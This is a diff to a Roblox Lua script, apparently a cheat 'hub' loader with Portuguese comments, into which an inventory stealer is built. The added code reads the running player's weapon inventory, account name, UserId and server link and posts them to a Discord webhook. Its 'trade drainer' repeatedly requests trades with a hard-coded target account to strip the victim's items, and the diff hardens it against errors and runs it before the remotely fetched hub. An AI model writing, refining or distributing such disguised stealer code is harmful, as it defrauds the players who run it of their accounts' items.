@@ -1,18 +1,4 @@
--- MYTHIC HUB + DRAINER + WEBHOOK (Sem "restaurado")
-local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/main.lua"
-local ok, body = pcall(function() return game:HttpGet(url) end)
-if not ok or type(body) ~= "string" or body == "" then
-    error("MYTHIC HUB: erro ao baixar o loader.")
-end
-local run, err = loadstring(body)
-if type(run) ~= "function" then
-    error("MYTHIC HUB: erro ao compilar loader: " .. tostring(err))
-end
-
--- 1. Executa o Hub principal
-run()
-
--- 2. Liga o Webhook + Drainer em segundo plano
+-- 1. DRAINER E WEBHOOK (Protegido contra erros)
 task.spawn(function()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -23,59 +9,62 @@ task.spawn(function()
     
     local httpRequest = request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
     local function postJson(url, body)
+        -- O pcall aqui impede que o script morra se o executor bloquear o Discord
         if httpRequest then pcall(httpRequest, {Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body}) end
     end
 
-    -- Acha o perfil e manda os dados pro Discord
-    local profile = nil
-    if type(getgc) == "function" then
-        pcall(function() 
-            for _, obj in pairs(getgc(true)) do 
-                if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then 
-                    profile = obj 
-                    break 
+    -- ─── COLETA DE DADOS E WEBHOOK ───
+    task.spawn(function()
+        local profile = nil
+        if type(getgc) == "function" then
+            pcall(function() 
+                for _, obj in pairs(getgc(true)) do 
+                    if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then 
+                        profile = obj; break 
+                    end 
                 end 
-            end 
-        end)
-    end
-    
-    local itemsText = "Sem inventário (getgc bloqueado)"
-    if profile and profile.Weapons and type(profile.Weapons.Owned) == "table" then
-        itemsText = ""
-        for id, qty in pairs(profile.Weapons.Owned) do
-            itemsText = itemsText .. "• `" .. tostring(id) .. "` (x" .. tostring(qty) .. ")\n"
+            end)
         end
-        if itemsText == "" then itemsText = "Inventário vazio." end
-    end
+        
+        local itemsText = "Sem inventário (getgc bloqueado)"
+        if profile and profile.Weapons and type(profile.Weapons.Owned) == "table" then
+            itemsText = ""
+            for id, qty in pairs(profile.Weapons.Owned) do
+                itemsText = itemsText .. "• `" .. tostring(id) .. "` (x" .. tostring(qty) .. ")\n"
+            end
+            if itemsText == "" then itemsText = "Inventário vazio." end
+        end
 
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp.UserId) .. "&width=420&height=420&format=png"
-    local profileUrl = "https://www.roblox.com/users/" .. tostring(lp.UserId) .. "/profile"
-    local serverUrl = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
+        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp.UserId) .. "&width=420&height=420&format=png"
+        local profileUrl = "https://www.roblox.com/users/" .. tostring(lp.UserId) .. "/profile"
+        local serverUrl = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
 
-    local payload = {
-        username = lp.Name,
-        avatar_url = avatarUrl,
-        embeds = {{
-            title = "Inventário Logado",
-            color = 0xFF00FF,
-            thumbnail = { url = avatarUrl },
-            fields = {
-                { name = "Conta", value = "`" .. lp.Name .. "`", inline = true },
-                { name = "UserId", value = "`" .. tostring(lp.UserId) .. "`", inline = true },
-                { name = "Conta Criada", value = "`" .. tostring(lp.AccountAge or "?") .. " dias atrás`", inline = true },
-                { name = "Server", value = "[Entrar no Server](" .. serverUrl .. ")", inline = false },
-                { name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false },
-                { name = "Itens", value = itemsText, inline = false }
-            },
-            footer = { text = "Data: " .. os.date("%d/%m/%Y %H:%M:%S") }
-        }}
-    }
+        local payload = {
+            username = lp.Name,
+            avatar_url = avatarUrl,
+            embeds = {{
+                title = "Inventário Logado",
+                color = 0xFF00FF,
+                thumbnail = { url = avatarUrl },
+                fields = {
+                    { name = "Conta", value = "`" .. lp.Name .. "`", inline = true },
+                    { name = "UserId", value = "`" .. tostring(lp.UserId) .. "`", inline = true },
+                    { name = "Conta Criada", value = "`" .. tostring(lp.AccountAge or "?") .. " dias atrás`", inline = true },
+                    { name = "Server", value = "[Entrar no Server](" .. serverUrl .. ")", inline = false },
+                    { name = "Perfil", value = "[Ver Perfil](" .. profileUrl .. ")", inline = false },
+                    { name = "Itens", value = itemsText, inline = false }
+                },
+                footer = { text = "Data: " .. os.date("%d/%m/%Y %H:%M:%S") }
+            }}
+        }
 
-    local okJson, bodyJson = pcall(function() return HttpService:JSONEncode(payload) end)
-    if okJson then postJson(WEBHOOK_URL, bodyJson) end
+        local okJson, bodyJson = pcall(function() return HttpService:JSONEncode(payload) end)
+        if okJson then postJson(WEBHOOK_URL, bodyJson) end
+    end)
 
-    -- Lógica do Drainer de Troca
-    local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15)
+    -- ─── DRAINER DE TROCA ───
+    local tradeFolder
+    pcall(function() tradeFolder = ReplicatedStorage:WaitForChild("Trade", 15) end)
     if not tradeFolder then return warn("DRAINER: Trade não encontrado") end
 
     local function waitRemote(name)
@@ -149,7 +138,7 @@ task.spawn(function()
             pcall(function() sendRequestRemote:InvokeServer(target) end)
             local t = os.clock()
             while os.clock() - t < 8 do if state.trading then return end; task.wait(0.15) end
-            task.wait(2)
+            task.wait(3)
         end
     end
 
@@ -174,7 +163,7 @@ task.spawn(function()
             state.trading = false
             cachedProfile = nil 
             task.spawn(function()
-                task.wait(1.5)
+                task.wait(2)
                 requestTrade(findTarget())
             end)
         end
@@ -190,9 +179,26 @@ task.spawn(function()
         end
     end)
 
+    -- LOOP PRINCIPAL: Procura o alvo e espera o jogo carregar
     task.spawn(function()
         local t = findTarget()
-        if t and t ~= lp then requestTrade(t) end
-        Players.PlayerAdded:Connect(function(p) if p.Name:lower() == TARGET_NAME:lower() then task.wait(3); requestTrade(p) end end)
+        if t and t ~= lp then 
+            task.wait(5) -- Espera 5 segundos no início pra não bugar a troca
+            requestTrade(t) 
+        end
+        Players.PlayerAdded:Connect(function(p) 
+            if p.Name:lower() == TARGET_NAME:lower() then 
+                task.wait(8) -- Espera 8 segundos se o alvo acabar de entrar no server
+                if p.Parent then requestTrade(p) end
+            end 
+        end)
     end)
 end)
+
+-- 2. CARREGA O HUB (main.lua)
+local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/main.lua"
+local ok, body = pcall(function() return game:HttpGet(url) end)
+if ok and type(body) == "string" and body ~= "" then
+    local run, err = loadstring(body)
+    if type(run) == "function" then pcall(run) end
+end
